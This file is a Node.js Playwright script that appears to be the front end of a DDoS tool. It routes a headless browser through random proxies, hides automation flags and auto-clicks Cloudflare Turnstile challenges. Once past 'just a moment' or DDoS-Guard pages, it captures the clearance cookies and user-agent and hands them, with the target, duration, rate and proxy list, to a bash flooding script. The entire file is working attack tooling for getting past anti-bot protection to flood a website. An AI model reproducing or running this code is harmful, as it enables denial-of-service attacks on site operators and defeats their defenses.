const { chromium } = require('playwright');
const fs = require('fs');
const { setTimeout } = require('timers/promises');
const { exec } = require('child_process');

let [TARGET, TIME, RATE, PROXY, VERBOSE] = process.argv.slice(2);
let proxies = fs.readFileSync(PROXY, 'utf8').split('\n');

(async () => {
    for (let i = 0; i < 10; i++) {
        let usedProxies = {};
        const browser = await chromium.launch({
            args: [
                '--ignore-certificate-errors',
                '--no-zygote',
                '--no-sandbox',
                '--language=en_US',
                '--disable-gpu',
                `--proxy-server=${proxies[~~(Math.random() * (proxies.length))]}`,
                '--disable-background-networking',
                '--disable-software-rastrizier',
                '--disable-dev-shm',
                '--disable-blink-features=AutomationControlled',
                '--renderer-process-limit=1',
                '--num=1'
            ],
            headless: true
        });
        const context = await browser.newContext();
        const page = await context.newPage();
        await page.goto('about:blank');
        const client = await page.context().newCDPSession(page);
        await client.send('Network.enable');
        async function turnstile() {
            setInterval(async () => {
                const rect = await client.send('Runtime.evaluate', {
                    expression: `JSON.stringify(document.querySelector(".ctp-checkbox-container map img, .ctp-checkbox-container input") == null ? {} : document.querySelector(".ctp-checkbox-container map img, .ctp-checkbox-container input").getBoundingClientRect().toJSON())`
                });
                if (rect.result) {
                    const rectValue = JSON.parse(rect.result.value);
                    if (rectValue) {
                        await client.send('Input.dispatchMouseEvent', {
                            type: 'mouseMoved',
                            x: rectValue.x + rectValue.width / 2,
                            y: rectValue.y + rectValue.height / 2
                        });
                        await client.send('Input.dispatchMouseEvent', {
                            type: 'mousePressed',
                            button: 'left',
                            x: rectValue.x + rectValue.width / 2,
                            y: rectValue.y + rectValue.height / 2,
                            clickCount: 1
                        });
                        await client.send('Input.dispatchMouseEvent', {
                            type: 'mouseReleased',
                            button: 'left',
                            x: rectValue.x + rectValue.width / 2,
                            y: rectValue.y + rectValue.height / 2,
                            clickCount: 1
                        });
                    }
                }
            }, 7000);
        }
        let titleValue = '';
        let ttt = [];
        function title() {
            setInterval(async () => {
                const tt = await client.send('Runtime.evaluate', {
                    expression: 'document.title'
                });
                if (tt.result != null) {
                    const ttValue = tt.result.value;
                    if (ttValue != titleValue) {
                        titleValue = ttValue;
                        console.log('One_Title: ', titleValue);
                        try {
                            ttt.push(titleValue);
                        } catch (eeee) {
                            console.log(eeee);
                        }
                    }
                } else {
                    tt = 'errorrr';
                }
            }, 1000);
        }
        const deviceMemories = [2, 4, 8];
        const hardwareConcurrency = deviceMemories[~~(Math.random() * deviceMemories.length)];
        const deviceMemory = deviceMemories[~~(Math.random() * deviceMemories.length)];
        await client.send('Target.setDiscoverTargets', { discover: true });
        await client.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: true, flatten: true });
        await client.send('Page.enable', {});
        let request = null;
        let mainFrame = null;
        let response = false;
        await new Promise(async (resolve) => {
            let timer = null;
            const requestsIds = {};
            client.on('Network.requestWillBeSent', (data) => {
                requestsIds[data.requestId] = data;
                if (timer != null) {
                    clearTimeout(timer);
                }
                timer = setTimeout(resolve, 2000);
            });
            client.on('Network.requestWillBeSentExtraInfo', (data) => {
                if (!requestsIds[data.requestId]) {
                    return;
                }
                Object.assign(requestsIds[data.requestId], { extra: data });
                if (mainFrame.frameId == requestsIds[data.requestId].frameId && requestsIds[data.requestId].type == 'Document') {
                    request = requestsIds[data.requestId].extra.headers;
                    timer = setTimeout(resolve, 2000);
                }
            });
            client.on('Network.responseReceived', (data) => {
                if (data.frameId == mainFrame.frameId) {
                    response = true;
                }
            });
            mainFrame = await client.send('Page.navigate', { url: 'about:blank' });
            await client.send('Network.enable', {});
            await client.send('Page.navigate', { url: TARGET });
            title();
        });
        const protections = ['just a moment', 'один момент', 'ddos-guard', 'ddos guard', 'extern uam'];
        await new Promise(async (r1) => {
            while (ttt.length == 0 || protections.filter(a => ttt[ttt.length - 1].toLowerCase().indexOf(a) != -1).length > 0) {
                await setTimeout(100);
            }
            r1();
        });
        console.log('Title: ', await client.send('Runtime.evaluate', { expression: `JSON.stringify([document.title])` }));
        if (!request || !response) {
            console.log('no');
            await browser.close();
            return;
        }
        const url = new URL(TARGET);
        await client.send('Network.emulateNetworkConditions', { offline: true, latency: -1, downloadThroughput: -1, uploadThroughput: -1 });
        const cookies = await client.send('Network.getCookies', { urls: [`${url.protocol}//${url.host}`] });
        const headers = Object.entries(request)
            .filter(x => !x[0].startsWith('content-') && !x[0].startsWith(':'))
            .map(x => ({ name: x[0], value: x[1] }));
        let userAgentHeader = headers.filter(x => x.name.toLowerCase() === 'user-agent')[0];
        if (userAgentHeader) {
            userAgentHeader = userAgentHeader.value;
        }
        const uaString = userAgentHeader.split('').join('');
        function parseCookie(c) {
            let result = [`${c.name}=${c.value}`, `path=${c.path}`];
            if (c.expires > 0) {
                result.push(`expires=${new Date(c.expires * 1000).toUTCString()}`);
            }
            if (c.domain) {
                result.push(`domain=${c.domain}`);
            }
            if (c.httpOnly) {
                result.push('HttpOnly');
            }
            if (c.secure) {
                result.push('Secure');
            }
            if (c.sameSite) {
                result.push(`SameSite=${c.sameSite}`);
            }
            return result.join('; ');
        }
        const cookiesArray = cookies.cookies.map(x => [parseCookie(x)]);
        const modproxy = PROXY.replace(/\r/g, '');
        const args = [
            '75128.sh',
            'stmerisnxver',
            TARGET,
            TIME,
            RATE,
            modproxy,
            'user-agent@' + uaString
        ].concat(...cookiesArray);
        await exec(`bash ${args.map(x => `'${x}'`).join(' ')}`);
        await browser.close();
    }
})();
